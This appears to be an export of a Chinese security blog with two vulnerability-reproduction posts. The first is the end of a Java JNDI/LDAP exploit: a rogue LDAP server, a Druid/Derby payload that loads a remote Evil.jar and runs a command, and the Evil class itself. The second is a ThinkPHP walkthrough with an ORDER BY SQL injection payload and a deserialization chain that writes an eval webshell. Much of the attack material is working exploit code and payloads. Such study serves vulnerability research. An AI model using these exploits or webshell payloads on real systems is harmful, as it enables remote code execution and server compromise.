class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test3</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>());</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                List&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                list.add(<span class="string">&quot;CALL SQLJ.INSTALL_JAR(&#x27;http://127.0.0.1:8000/Evil.jar&#x27;, &#x27;APP.Evil&#x27;, 0)&quot;</span>);</span><br><span class="line">                list.add(<span class="string">&quot;CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY(&#x27;derby.database.classpath&#x27;,&#x27;APP.Evil&#x27;)&quot;</span>);</span><br><span class="line">                list.add(<span class="string">&quot;CREATE PROCEDURE cmd(IN cmd VARCHAR(255)) PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME &#x27;Evil.exec&#x27;&quot;</span>);</span><br><span class="line">                list.add(<span class="string">&quot;CALL cmd(&#x27;calc&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;javax.sql.DataSource&quot;</span>, <span class="string">&quot;com.alibaba.druid.pool.DruidDataSourceFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;jdbc:derby:webdb;create=true&quot;</span>));</span><br><span class="line">                ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;init&quot;</span>, <span class="string">&quot;true&quot;</span>));</span><br><span class="line">                ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initialSize&quot;</span>, <span class="string">&quot;1&quot;</span>));</span><br><span class="line">                ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;initConnectionSqls&quot;</span>, String.join(<span class="string">&quot;;&quot;</span>, list)));</span><br><span class="line"></span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, SerializeUtil.serialize(ref));</span><br><span class="line"></span><br><span class="line">                result.sendSearchEntry(e);</span><br><span class="line">                result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Evil.java<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>编译打包<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac src/Evil.java</span><br><span class="line">jar -cvf Evil.jar -C src/ .</span><br><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></figure></p>
<p>==注意: 这种方法只能实现一次,第二次由于之前已经下载了这个数据库,所以添加的list可以注释掉前三行,只留下<code>list.add(&quot;CALL cmd(&#39;calc&#39;)&quot;);</code>执行命令即可,或者也可以删除数据库清空缓存==</p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401220403.png" alt="image.png"><br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240401221427.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp全版本漏洞复现总结</title>
    <url>/2024/04/02/thinkphp%E5%85%A8%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>这个是之前学的,当复习重新看一遍,顺便发到很久没更的博客里</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装:"></a>安装:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=5.0.* tp5  --prefer-dist</span><br></pre></td></tr></table></figure>
<p>表示安装最新的5.0版本,这里是5.0.24,这里的<code>tp5</code>目录名可以任意更改,如果之前安装过,则切换到tp5应用根目录下,执行:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer update topthink/framework</span><br></pre></td></tr></table></figure><br>如果很卡:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定国内源</span><br><span class="line">composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/</span><br><span class="line"></span><br><span class="line">composer config -g -l</span><br></pre></td></tr></table></figure></p>
<p>此时安装成功会有一个提示<code>composer audit</code>可以查看历史漏洞,我们进入www.tp5.com目录查看一下发现有7个CVE,后面会一个个分析</p>
<h3 id="一些基础"><a href="#一些基础" class="headerlink" title="一些基础"></a>一些基础</h3><p>目录结构在readme文件有解释<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">router.php用于php自带webserver支持，可用于快速测试  </span><br><span class="line">启动命令：php -S localhost:8888 router.php</span><br></pre></td></tr></table></figure></p>
<p>开启调试:<br>config.php里面的app_debug参数设置为true,或者项目根目录创建.env文件:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app_debug =  true</span><br></pre></td></tr></table></figure><br>定义了<code>.env</code>文件后，配置文件中定义<code>app_debug</code>参数无效</p>
<p>关于URL路由访问的规则:</p>
<ol>
<li><p>普通模式: 当没有自定义路由或者<code>url_route_on</code>参数为false的情况下,采用<code>PATH_INFO</code>格式访问,即<code>http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</code>,比如在<code>app\index\controller</code>下写一个Test1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;this is function test1&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;this is index!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dump</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们访问:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.tp5.com:8000/index.php/index/test1/test1 返回this is function test1</span><br><span class="line">http://www.tp5.com:8000/index.php/index/test1/index 返回this is index!</span><br></pre></td></tr></table></figure>
<p>此外: 还有一种兼容模式访问如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://serverName/index.php（或者其它应用入口文件）?s=/模块/控制器/操作/[参数名/参数值...]</span><br></pre></td></tr></table></figure>
<p>eg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.tp5.com:8000/?s=index/Test1/test1</span><br><span class="line">http://www.tp5.com:8000/?s=index/Test1/index</span><br></pre></td></tr></table></figure>
</li>
<li><p>混合模式(默认)<br>配置：<code>&#39;url_route_on&#39;=&gt;true,&#39;url_route_must&#39;=&gt;false</code><br>已注册用路由访问，未注册仍用PATH_INFO访问</p>
</li>
<li>强制模式<br>配置：<code>&#39;url_route_on&#39;=&gt;true,&#39;url_route_must&#39;=&gt;true</code><br>全部访问必须采用路由模式，包括首页’/’</li>
</ol>
<p>讲了路由访问模式自然要说怎么自定义路由!<br>路由定义采用<code>\think\Route</code>类的<code>rule</code>方法注册，通常是在应用的路由配置文件<code>application/route.php</code>进行注册，格式是：<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Route::rule(&#x27;路由表达式&#x27;,&#x27;路由地址&#x27;,&#x27;请求类型&#x27;,&#x27;路由参数（数组）&#x27;,&#x27;变量规则（数组）&#x27;);</span><br></pre></td></tr></table></figure><br>eg1<br>apploication/app/controller/Index.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line"><span class="comment">//        echo &quot;hello&quot;.$id;</span></span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="title function_ invoke__">input</span>());</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>());</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">route</span>());</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">param</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>application/route.php<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Route</span>;  </span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">rule</span>(<span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;index/Index/index&#x27;</span>);  </span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;hello/:id&#x27;</span>,<span class="string">&#x27;index/Index/hello&#x27;</span>);</span><br></pre></td></tr></table></figure><br>访问<code>http://www.tp5.com:8000/index.php/hello/1?name=jmx</code><br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(2) &#123;</span><br><span class="line">  &#x27;name&#x27; =&gt;</span><br><span class="line">  string(3) &quot;jmx&quot;</span><br><span class="line">  &#x27;id&#x27; =&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\WWW\www.tp5.com\thinkphp\library\think\Debug.php:193:</span><br><span class="line">array(1) &#123;</span><br><span class="line">  &#x27;name&#x27; =&gt;</span><br><span class="line">  string(3) &quot;jmx&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\WWW\www.tp5.com\thinkphp\library\think\Debug.php:193:</span><br><span class="line">array(1) &#123;</span><br><span class="line">  &#x27;id&#x27; =&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">D:\phpstudy_pro\WWW\www.tp5.com\thinkphp\library\think\Debug.php:193:</span><br><span class="line">array(2) &#123;</span><br><span class="line">  &#x27;name&#x27; =&gt;</span><br><span class="line">  string(3) &quot;jmx&quot;</span><br><span class="line">  &#x27;id&#x27; =&gt;</span><br><span class="line">  string(1) &quot;1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="CVE-2018-16385"><a href="#CVE-2018-16385" class="headerlink" title="CVE-2018-16385"></a>CVE-2018-16385</h2><h3 id="简历"><a href="#简历" class="headerlink" title="简历"></a>简历</h3><p>在ThinkPHP5.1.23之前的版本中存在SQL注入漏洞，该漏洞是由于程序在处理order by 后的参数时，未正确过滤处理数组的key值所造成。如果该参数用户可控，且当传递的数据为数组时，会导致漏洞的产生。</p>
<h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><p>ThinkPHP &lt; 5.1.23</p>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>安装thinkphp5.1.22<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/top-think/think.git</span><br><span class="line">git checkout v5.1.22</span><br><span class="line">修改composer.json的topthink/framework值为5.1.22</span><br><span class="line">composer install</span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240217222209.png" alt="image.png"></p>
<p>测试成功<br>在config/database.php配置好数据库连接参数<br>数据库创建一个user表,表里创建一个id字段<br>config/app.php里的debug模式改为true</p>
<p>修改Index.php:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sql</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello ,this is sql test!&quot;</span>;</span><br><span class="line">        <span class="variable">$data</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$data</span>[<span class="string">&#x27;id&#x27;</span>]=<span class="keyword">array</span>(<span class="string">&#x27;eq&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">        <span class="variable">$order</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>];</span><br><span class="line">        <span class="variable">$m</span>=<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="variable">$data</span>)-&gt;<span class="title function_ invoke__">order</span>(<span class="variable">$order</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="variable">$m</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>find()函数-&gt;中间跳了很多-&gt;/thinkphp/library/think/db/Builder.php parseOrder()的函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240217233529.png" alt="image.png"><br>oreach函数将$order数组分为key和value形式。<br>进入parseOrderField()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240217233631.png" alt="image.png"></p>
<p>这里重点是foreach循环对<code>$val</code>的值做处理,但是这个val的值不用管,最后拼接sql语句是key的值,val在key后面,可以用注释符注释掉<br>进入parseDataBind()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240217233839.png" alt="image.png"><br>这里最后返回字符串,对传入的key的前面拼接了字符串:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:data__id`,111)|updatexml(1,concat(0x3a,user()),1)#0</span><br></pre></td></tr></table></figure><br>然后回到parseOrderField()函数<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="string">&#x27;field(&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$query</span>, <span class="variable">$key</span>, <span class="literal">true</span>) . <span class="string">&#x27;,&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$val</span>) . <span class="string">&#x27;)&#x27;</span> . <span class="variable">$sort</span>;</span><br></pre></td></tr></table></figure></p>
<p>调用Mysql的 parseKey()函数:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240217234154.png" alt="image.png"><br>拼接了一对反引号在key变量两头:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`id`,111)|updatexml(1,concat(0x3a,user()),1)#`</span><br></pre></td></tr></table></figure></p>
<p>最后返回:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">field(`id`,111)|updatexml(1,concat(0x3a,user()),1)#`,:data__id`,111)|updatexml(1,concat(0x3a,user()),1)#0)</span><br></pre></td></tr></table></figure></p>
<p>然后回到了Builer.php的parseOrder()函数<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240217234517.png" alt="image.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ORDER BY field(`id`,111)|updatexml(1,concat(0x3a,user()),1)#`,:data__id`,111)|updatexml(1,concat(0x3a,user()),1)#0)</span><br></pre></td></tr></table></figure>
<p>一直调试到后面可以看到sql语句:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM `user` WHERE  `id` IN (:where_AND_id_in_1,:where_AND_id_in_2) ORDER BY field(`id`,111)|updatexml(1,concat(0x3a,user()),1)#`,:data__id`,111)|updatexml(1,concat(0x3a,user()),1)#0) LIMIT 1  </span><br></pre></td></tr></table></figure></p>
<p><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240217235448.png" alt="image.png"></p>
<p>这里由于field函数，漏洞利用有两个关键点:</p>
<ol>
<li>field()函数必须指定大于等于两个字段才可以正常运行，否则就会报错,当表中只有一个字段时，我们可以随意指定一个数字或字符串的参数</li>
<li>当field中的参数不是字符串或数字时，指定的参数必须是正确的表字段，否则程序就会报错。这里由于程序会在第一个字段中加 限制 ,所以必须指定正确的字段名称。第二个字段没有限制，可以指定字符串或数字</li>
</ol>
<h2 id="CVE-2021-36564"><a href="#CVE-2021-36564" class="headerlink" title="CVE-2021-36564"></a>CVE-2021-36564</h2><h3 id="简历-1"><a href="#简历-1" class="headerlink" title="简历"></a>简历</h3><p>ThinkPHP v6.0.8 通过组件 <code>vendor\league\flysystem-cached-adapter\src\Storage\Adapter.php</code>发现一个反序列化漏洞。</p>
<h3 id="范围-1"><a href="#范围-1" class="headerlink" title="范围:"></a>范围:</h3><p>thinkphp&lt;6.0.9</p>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>这里装tp6.0.8<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">composer create-project topthink/think=6.0.x tp6.0.8</span><br></pre></td></tr></table></figure><br>老规矩删lock文件改comoser.json重新composer install一遍</p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>很简单的链子.应该是最短的了<br>Poc:<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Adapter</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Local</span></span>&#123;&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">League</span>\<span class="title class_">Flysystem</span>\<span class="title class_">Cached</span>\<span class="title class_">Storage</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">League</span>\<span class="title">Flysystem</span>\<span class="title">Adapter</span>\<span class="title">Local</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$autosave</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cache</span> = [];</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">AbstractCache</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$adapter</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;autosave=<span class="literal">false</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;adapter=<span class="keyword">new</span> <span class="title class_">Local</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="string">&#x27;huahua.php&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache=[<span class="string">&#x27;huahua&#x27;</span>=&gt;<span class="string">&#x27;&lt;?php eval($_GET[1]);?&gt;&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Adapter</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>入口点是<code>abstract class AbstractCache</code>中的<code>__destruct</code>方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240218225728.png" alt="image.png"></p>
<p>但是PHP的抽象方法不能被实例化,因此需要实例化它的子类,这里选择的是<code>League\Flysystem\Cached\Storage</code>的Adapter.php</p>
<p>然后进入Adapter.php的save()方法:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240218225756.png" alt="image.png"><br>目标是进入write()方法,里面有file_put_contents,这里参数都可以控制<br>首先看一下getForStorage()方法,它影响了write函数写入文件的内容content<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240218225853.png" alt="image.png"><br>它会返回一个json加密的数据,这个参数是cache,<code>protected $cache = [];</code>我们实例化的时候可控<br>进入cleanContents()函数:<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240218230029.png" alt="image.png"><br>我们只需要传入的cache是一个一维数组就不会进入if语句<br>然后考虑这个<code>this-&gt;adapter</code>变量,这里找的是同时具有has()方法和write()方法的类,找到的是<code>League\Flysystem\Adapter</code>的Local.php</p>
<p>首先has方法我们需要保证返回false<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240218230352.png" alt="image.png"><br>进入applyPathPrefix()<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240218230413.png" alt="image.png"><br>很简单的字符串拼接,我们传入的$this-&gt;file只要是一个不存在的文件就行<br>进入write()方法<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240218230508.png" alt="image.png"><br>一样的先调用applyPathPrefix()方法,拼接一下文件路径,这里做的限制是删除路径的<code>/</code>字符,tp默认写入文件就是public目录我们不需要设置路径<br><img src="https://image-1317255302.cos.ap-shanghai.myqcloud.com/markdown/20240218230643.png" alt="image.png"><br>最后成功写入木马</p>
